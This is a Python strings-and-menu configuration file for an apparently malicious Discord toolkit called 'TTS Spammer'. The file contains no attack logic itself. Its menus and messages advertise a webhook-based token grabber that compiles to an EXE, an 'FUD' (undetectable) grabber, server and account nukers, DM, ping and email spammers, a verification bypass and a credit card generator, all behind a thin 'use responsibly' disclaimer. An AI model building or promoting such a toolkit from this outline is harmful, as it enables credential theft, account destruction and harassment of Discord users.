# -*- coding: utf-8 -*-
"""
Strings Configuration for TTS Spammer
All text strings used in the application
"""

# Changelog Configuration
CHANGELOG = [
    "v0.4.7 - Latest Update:",
    "✓ Added Account Nuker feature",
    "✓ Improved changelog system",
    "✓ Better menu organization",
    "✓ Enhanced UI layout",
    "",
    "v0.4.5 - Previous Updates:",
    "✓ Fixed Discord spam functions",
    "✓ Improved token validation", 
    "✓ Better error handling",
    "✓ Added token tester utility",
    "",
    "v0.4.4 - Bug Fixes:",
    "✓ Enhanced server tools",
    "✓ FUD grabber improvements",
    "✓ Advanced destruction tools", 
    "✓ Better UI/UX design",
    "",
    "Coming Soon:",
    "• More advanced Discord tools",
    "• Enhanced security features", 
    "• Better token management",
    "• Additional nuke options"
]

# Menu Headers
MENU_HEADERS = {
    "main": "MAIN MENU - Select Category:",
    "spam_tools": "SPAM TOOLS - Select Option:",
    "discord_tools": "DISCORD TOOLS - Select Option:",
    "token_tools": "TOKEN TOOLS - Select Option:",
    "server_tools": "SERVER TOOLS - Select Option:",
    "user_tools": "USER TOOLS - Select Option:",
    "settings_tools": "SETTINGS TOOLS - Select Option:",
    "generators": "GENERATORS - Select Option:",
    "non_discord": "NON-DISCORD TOOLS - Select Option:",
    "advanced": "ADVANCED DESTRUCTION - Select Option:",
    "grabber": "GRABBER - Select Option:",
    "fud_grabber": "FUD GRABBER - Select Option:"
}

# Menu Choices
MENU_CHOICES = {
    "main": [
        " Spam Tools",
        " Discord Tools",
        " Token Tools", 
        " Server Tools",
        " User Tools",
        " Settings Tools",
        " Generators",
        " Non-Discord Tools",
        " Advanced Destruction Tools",
        " Grabber",
        " FUD Grabber",
        " Changelog",
        " Exit"
    ],
    "spam_tools": [
        "Discord Webhook Spammer",
        "Theme Spammer",
        "Ping Spam", 
        "Channel Spam",
        "DM Spam",
        "Friend Request Spam",
        "Email Spam",
        "← Back to main menu"
    ],
    "discord_tools": [
        "Close All DMs",
        "Unfriend All Friends",
        "DM All Friends",
        "Delete/Leave All Servers",
        "Mass Join/Leave",
        "Mass React",
        "Verification Bypass",
        "Server Scanner",
        "User Lookup",
        "Invite Resolver",
        "← Back to main menu"
    ],
    "token_tools": [
        "Token Info",
        "Token Login",
        "Token Checker",
        "← Back to main menu"
    ],
    "server_tools": [
        "Server Cloner",
        "Webhook Deleter",
        "Server Management",
        "← Back to main menu"
    ],
    "user_tools": [
        "Custom Status Changer",
        "Nickname Changer", 
        "Avatar Changer",
        "← Back to main menu"
    ],
    "settings_tools": [
        "Language & Theme Spam",
        "← Back to main menu"
    ],
    "generators": [
        "Nitro Generator & Checker",
        "Token Generator",
        "Credit Card Generator",
        "← Back to main menu"
    ],
    "non_discord": [
        " Email Bomber",
        " Advanced IP & Network Scanner",
        " Website Security Analyzer", 
        " Crypto & Hash Tools",
        "← Back to main menu"
    ],
    "advanced": [
        " Server Nuke",
        " Account Nuker",
        " Mass Ban/Kick Manager",
        " Permission Chaos",
        " Channel Flood",
        " Role Spam", 
        " Webhook Bomb",
        "← Back to main menu"
    ],
    "grabber": [
        "Set Webhook",
        "Compile to EXE",
        "Run Grabber",
        "Back to Main Menu"
    ],
    "token_login": [
        "Selenium Login (Recommended)",
        "Browser Login (Not Recommended)",
        "← Back to Token Tools"
    ]
}

# Info Content for Side Display (no menu duplication)
INFO_CONTENT = {
    "main": [
        "TOOL INFORMATION:",
        "─" * 40,
        "Total Categories: 11",
        "Active Tools: 50+",
        "Version: Latest Stable",
        "",
        "Navigation:",
        "• Use arrow keys ↑↓",
        "• Press Enter to select",
        "• Ctrl+C to cancel",
        "",
        "Support:",
        "• Discord: cyberseall", 
        "• Server: ZgwVCdxH9Y",
        "",
        "Status:",
        "✓ All systems operational",
        "✓ Updated dependencies",
        "✓ Security patches applied"
    ],
    "spam_tools": [
        "SPAM TOOLS INFO:",
        "─" * 40,
        "Recently Fixed:",
        "✓ Channel spam working",
        "✓ Ping spam improved",
        "✓ Better error handling",
        "✓ Token validation added",
        "",
        "Requirements:",
        "• Valid Discord tokens",
        "• Target permissions",
        "• Network connectivity",
        "",
        "Tips:",
        "• Test tokens first",
        "• Use debug mode",
        "• Check rate limits",
        "• Follow Discord ToS"
    ],
    "discord_tools": [
        "DISCORD TOOLS INFO:",
        "─" * 40,
        "Token Testing:",
        "• Use Token Tester first",
        "• File: token_tester.py",
        "• Location: utils/spamming/",
        "",
        "Common Issues:",
        "• Invalid tokens (401)",
        "• No permissions (403)",
        "• Rate limiting (429)",
        "• Network timeouts",
        "",
        "Best Practices:",
        "• Validate before use",
        "• Enable debug mode",
        "• Respect rate limits"
    ],
    "advanced": [
        "DESTRUCTION TOOLS WARNING:",
        "─" * 40,
        "⚠️ DANGER LEVEL: HIGH",
        "",
        "These tools are DESTRUCTIVE!",
        "Use responsibly and at your",
        "own risk.",
        "",
        "Requirements:",
        "• Admin permissions",
        "• Valid Discord tokens", 
        "• Target server access",
        "• Proper authorization",
        "",
        "Legal Notice:",
        "Only use on servers you own",
        "or have explicit permission",
        "to modify."
    ]
}

# Input Prompts
PROMPTS = {
    "webhook_url": "Enter Discord Webhook URL: ",
    "message": "Enter your message: ",
    "token": "Enter Discord Token: ",
    "amount": "How many messages to send? (amount): ",
    "interval": "Interval between messages (seconds): ",
    "channel_id": "Enter channel ID: ",
    "server_id": "Enter server ID: ",
    "user_id": "Enter user ID: ",
    "debug": "Enable debug mode? (y/n): ",
    "tts": "Enable TTS?",
    "continue": "Back to menu?",
    "confirm": "Do you want to continue? (y/n): "
}

# Status Messages
STATUS_MESSAGES = {
    "waiting_input": "Waiting for input...",
    "waiting_webhook": "Waiting for webhook input...",
    "waiting_message": "Waiting for message input...",
    "waiting_amount": "Waiting for amount and interval...",
    "webhook_set": "Webhook set. Waiting for message...",
    "message_set": "Message set.",
    "sending": "Sending message...",
    "success": "Success!",
    "error": "Error!",
    "no_webhook": "No webhook entered.",
    "no_message": "No message entered.",
    "no_token": "No token provided!",
    "invalid_input": "Invalid input!",
    "cancelled": "Operation cancelled."
}

# Success/Error Messages
MESSAGES = {
    "success": {
        "message_sent": "✓ Message sent successfully!",
        "webhook_set": "✓ Grabber webhook set successfully!",
        "compiled": "✓ Token grabber compiled successfully!",
        "token_valid": "✓ Token is VALID",
        "channel_access": "✓ Channel access GRANTED"
    },
    "error": {
        "message_failed": "✗ Error sending message!",
        "webhook_failed": "✗ Error setting grabber webhook!",
        "token_invalid": "✗ Token is INVALID or EXPIRED",
        "unauthorized": "✗ Unauthorized - Invalid token",
        "forbidden": "✗ Forbidden - No permission",
        "not_found": "✗ Channel/Resource not found",
        "timeout": "✗ Connection timeout",
        "rate_limited": "Rate limited! Waiting {} seconds..."
    },
    "info": {
        "no_webhook": "No webhook URL provided.",
        "no_token": "No token entered twice. Returning to main menu...",
        "compilation": "This will compile the token grabber into an executable (.exe) file",
        "destructive_warning": "These tools are DESTRUCTIVE! Use responsibly and at your own risk."
    }
}

# Banner and UI Elements
UI_ELEMENTS = {
    "separator": "─" * 40,
    "thick_separator": "═" * 40,
    "changelog_header": "📋 CHANGELOG - Version {}",
    "menu_separator": " │ ",
    "bullet": "•",
    "arrow_back": "←",
    "arrow_forward": "→",
    "checkmark": "✓",
    "cross": "✗",
    "warning": "⚠️",
    "info": "💡",
    "tool": "🔧"
}

# Color Scheme (RGB values)
COLORS = {
    "header": (255, 128, 0),
    "separator": (255, 64, 64), 
    "success": (0, 255, 128),
    "error": (255, 0, 0),
    "warning": (255, 255, 0),
    "info": (0, 200, 255),
    "text": (255, 255, 255),
    "muted": (200, 200, 200),
    "version": (255, 128, 255),
    "changelog_done": (0, 255, 128),
    "changelog_coming": (255, 255, 0)
} 